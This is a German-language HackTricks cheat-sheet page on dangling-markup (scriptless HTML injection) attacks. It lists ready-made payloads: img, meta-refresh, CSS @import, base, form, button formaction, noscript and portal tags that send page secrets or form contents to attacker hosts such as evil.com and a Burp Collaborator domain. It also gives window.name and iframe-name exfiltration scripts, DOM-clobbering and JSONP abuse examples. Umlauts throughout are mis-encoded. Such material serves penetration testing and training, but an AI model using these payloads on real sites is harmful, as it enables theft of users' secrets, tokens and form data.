# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Resume

Diese Technik kann verwendet werden, um Informationen von einem Benutzer zu extrahieren, wenn eine **HTML-Injection gefunden wird**. Dies ist sehr n√ºtzlich, wenn du **keinen Weg findest, um eine** [**XSS** ](../xss-cross-site-scripting/)zu exploiten, aber du **einige HTML-Tags injizieren kannst**.\
Es ist auch n√ºtzlich, wenn ein **Geheimnis im Klartext** im HTML gespeichert ist und du es **exfiltrieren** m√∂chtest, oder wenn du eine Skriptausf√ºhrung irref√ºhren m√∂chtest.

Mehrere hier kommentierte Techniken k√∂nnen verwendet werden, um einige [**Content Security Policy**](../content-security-policy-csp-bypass/) zu umgehen, indem Informationen auf unerwartete Weise exfiltriert werden (HTML-Tags, CSS, HTTP-Meta-Tags, Formulare, Basis...).

## Hauptanwendungen

### Stehlen von Klartextgeheimnissen

Wenn du `<img src='http://evil.com/log.cgi?` injizierst, wenn die Seite geladen wird, wird das Opfer dir den gesamten Code zwischen dem injizierten `img`-Tag und dem n√§chsten Anf√ºhrungszeichen im Code senden. Wenn sich ein Geheimnis irgendwie in diesem Abschnitt befindet, wirst du es stehlen (du kannst dasselbe mit einem doppelten Anf√ºhrungszeichen tun, schau dir an, was interessanter sein k√∂nnte).

Wenn das `img`-Tag verboten ist (zum Beispiel aufgrund von CSP), kannst du auch `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` verwenden.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Beachten Sie, dass **Chrome HTTP-URLs** mit "<" oder "\n" blockiert, sodass Sie andere Protokollschemata wie "ftp" ausprobieren k√∂nnen.

Sie k√∂nnen auch CSS `@import` missbrauchen (es sendet den gesamten Code, bis es ein ";" findet).
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Du k√∂nntest auch **`<table`** verwenden:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Sie k√∂nnten auch ein `<base`-Tag einf√ºgen. Alle Informationen werden gesendet, bis das Zitat geschlossen ist, aber es erfordert einige Benutzerinteraktion (der Benutzer muss auf einen Link klicken, da das Basistag die durch den Link angegebene Domain ge√§ndert hat):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Formulare stehlen
```html
<base href='http://evil.com/'>
```
Dann werden die Formulare, die Daten an den Pfad senden (wie `<form action='update_profile.php'>`), die Daten an die b√∂sartige Domain senden.

### Stealing forms 2

Setzen Sie einen Formular-Header: `<form action='http://evil.com/log_steal'>`, dies wird den n√§chsten Formular-Header √ºberschreiben und alle Daten aus dem Formular werden an den Angreifer gesendet.

### Stealing forms 3

Der Button kann die URL √§ndern, an die die Informationen des Formulars mit dem Attribut "formaction" gesendet werden.
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Ein Angreifer kann dies nutzen, um Informationen zu stehlen.

Finden Sie ein [**Beispiel f√ºr diesen Angriff in diesem Bericht**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Stehlen von Klartext-Geheimnissen 2

Mit der zuletzt erw√§hnten Technik zum Stehlen von Formularen (Einf√ºgen eines neuen Formular-Headers) k√∂nnen Sie dann ein neues Eingabefeld einf√ºgen:
```html
<input type='hidden' name='review_body' value="
```
und dieses Eingabefeld wird den gesamten Inhalt zwischen seinen doppelten Anf√ºhrungszeichen und dem n√§chsten doppelten Anf√ºhrungszeichen im HTML enthalten. Dieser Angriff kombiniert "_**Stealing clear text secrets**_" mit "_**Stealing forms2**_".

Sie k√∂nnen dasselbe tun, indem Sie ein Formular und ein `<option>`-Tag injizieren. Alle Daten bis ein geschlossenes `</option>` gefunden wird, werden gesendet:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Formparameter-Injektion

Sie k√∂nnen den Pfad eines Formulars √§ndern und neue Werte einf√ºgen, sodass eine unerwartete Aktion ausgef√ºhrt wird:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Stehlen von Klartextgeheimnissen √ºber noscript

`<noscript></noscript>` ist ein Tag, dessen Inhalt interpretiert wird, wenn der Browser JavaScript nicht unterst√ºtzt (Sie k√∂nnen JavaScript in Chrome unter [chrome://settings/content/javascript](chrome://settings/content/javascript) aktivieren/deaktivieren).

Eine M√∂glichkeit, den Inhalt der Webseite vom Punkt der Injektion bis zum Ende auf eine von einem Angreifer kontrollierte Seite zu exfiltrieren, besteht darin, Folgendes einzuf√ºgen:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassing CSP with user interaction

Aus dieser [Portsweigger-Forschung](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) k√∂nnen Sie lernen, dass Sie selbst aus den **am st√§rksten CSP-restriktiven** Umgebungen immer noch **Daten exfiltrieren** k√∂nnen, wenn Sie etwas **Benutzerinteraktion** haben. In diesem Fall werden wir das Payload verwenden:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Beachten Sie, dass Sie die **Opfer** bitten werden, auf einen **Link** zu **klicken**, der ihn zu einem von Ihnen kontrollierten **Payload** **umleitet**. Beachten Sie auch, dass das **`target`**-Attribut innerhalb des **`base`**-Tags **HTML-Inhalt** bis zum n√§chsten einfachen Anf√ºhrungszeichen enthalten wird.\
Dies wird dazu f√ºhren, dass der **Wert** von **`window.name`**, wenn der Link angeklickt wird, all diesen **HTML-Inhalt** enthalten wird. Daher, da Sie die Seite **kontrollieren**, auf die das Opfer zugreift, indem es auf den Link klickt, k√∂nnen Sie auf dieses **`window.name`** zugreifen und diese Daten **exfiltrieren**:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Irref√ºhrender Skript-Workflow 1 - HTML-Namensraum-Angriff

F√ºgen Sie ein neues Tag mit einer ID innerhalb des HTML ein, das das n√§chste √ºberschreibt und mit einem Wert, der den Fluss eines Skripts beeinflusst. In diesem Beispiel w√§hlen Sie aus, mit wem Informationen geteilt werden:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Irref√ºhrender Skript-Workflow 2 - Skript-Namensraum-Angriff

Erstellen Sie Variablen innerhalb des JavaScript-Namensraums, indem Sie HTML-Tags einf√ºgen. Dann wird diese Variable den Ablauf der Anwendung beeinflussen:
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Missbrauch von JSONP

Wenn Sie eine JSONP-Schnittstelle finden, k√∂nnten Sie in der Lage sein, eine beliebige Funktion mit beliebigen Daten aufzurufen:
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Oder Sie k√∂nnen sogar versuchen, etwas JavaScript auszuf√ºhren:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe-Missbrauch

Ein Kinddokument hat die F√§higkeit, die `location`-Eigenschaft seines Elternteils zu sehen und zu √§ndern, selbst in Cross-Origin-Situationen. Dies erm√∂glicht das Einbetten eines Skripts in ein **iframe**, das den Client auf eine beliebige Seite umleiten kann:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Dies kann mit etwas wie: `sandbox=' allow-scripts allow-top-navigation'` gemildert werden.

Ein iframe kann auch missbraucht werden, um sensible Informationen von einer anderen Seite **unter Verwendung des iframe name Attributs** zu leaken. Dies liegt daran, dass Sie ein iframe erstellen k√∂nnen, das sich selbst in ein iframe einf√ºgt und die HTML-Injection ausnutzt, die **sensible Informationen im iframe name Attribut erscheinen l√§sst** und dann diesen Namen vom urspr√ºnglichen iframe aus zugreifen und leaken kann.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
F√ºr weitere Informationen siehe [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta-Missbrauch

Sie k√∂nnten **`meta http-equiv`** verwenden, um **mehrere Aktionen** auszuf√ºhren, wie das Setzen eines Cookies: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` oder eine Weiterleitung durchzuf√ºhren (in 5s in diesem Fall): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Dies kann mit einer **CSP** bez√ºglich **http-equiv** ( `Content-Security-Policy: default-src 'self';`, oder `Content-Security-Policy: http-equiv 'self';`)

### Neuer \<portal HTML-Tag

Sie finden eine sehr **interessante Forschung** zu ausnutzbaren Schwachstellen des \<portal-Tags [hier](https://research.securitum.com/security-analysis-of-portal-element/).\
Zum Zeitpunkt des Schreibens m√ºssen Sie den Portal-Tag in Chrome unter `chrome://flags/#enable-portals` aktivieren, sonst funktioniert es nicht.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

Nicht alle M√∂glichkeiten, um Konnektivit√§t in HTML zu leaken, sind f√ºr Dangling Markup n√ºtzlich, aber manchmal k√∂nnte es helfen. √úberpr√ºfen Sie sie hier: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

Dies ist ein **Mix** aus **dangling markup und XS-Leaks**. Einerseits erlaubt die Schwachstelle, **HTML** (aber kein JS) in eine Seite **derselben Herkunft** wie die, die wir angreifen werden, zu **injizieren**. Andererseits werden wir die Seite, in die wir HTML injizieren k√∂nnen, nicht direkt **angreifen**, sondern **eine andere Seite**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search sind darauf ausgerichtet, **cross-origin Informationen zu exfiltrieren**, indem sie **Seitenkanalangriffe** ausnutzen. Daher ist es eine andere Technik als Dangling Markup, jedoch missbrauchen einige der Techniken die Einbeziehung von HTML-Tags (mit und ohne JS-Ausf√ºhrung), wie [**CSS Injection**](../xs-search/#css-injection) oder [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
